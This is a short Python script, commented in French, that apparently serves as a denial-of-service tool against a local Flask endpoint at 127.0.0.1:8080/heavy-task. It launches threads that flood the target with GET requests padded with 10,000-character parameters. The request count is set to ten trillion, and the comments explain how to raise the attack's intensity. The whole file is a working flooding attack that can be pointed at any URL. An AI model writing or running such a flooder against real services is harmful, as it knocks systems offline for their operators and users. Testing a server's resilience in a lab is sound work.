import requests
import threading
import time

def perform_dos_attack(target_url, num_requests):
    def send_request():
        try:
            # Envoyer une requête avec des données supplémentaires pour augmenter la charge
            response = requests.get(target_url, params={'data': 'x' * 10000})
            print(f"Request sent: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

    # Créer des threads pour simuler plusieurs requêtes simultanées
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()
        time.sleep(0.001)  # Petit délai pour éviter de surcharger la machine qui lance l'attaque

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    # URL cible du serveur Flask
    target = "http://127.0.0.1:8080/heavy-task"  # Assurez-vous que le serveur Flask tourne sur cette URL
    print("Starting DoS attack...")
    perform_dos_attack(target, num_requests=10000000000000)  # Modifier num_requests pour augmenter l'intensité de l'attaque
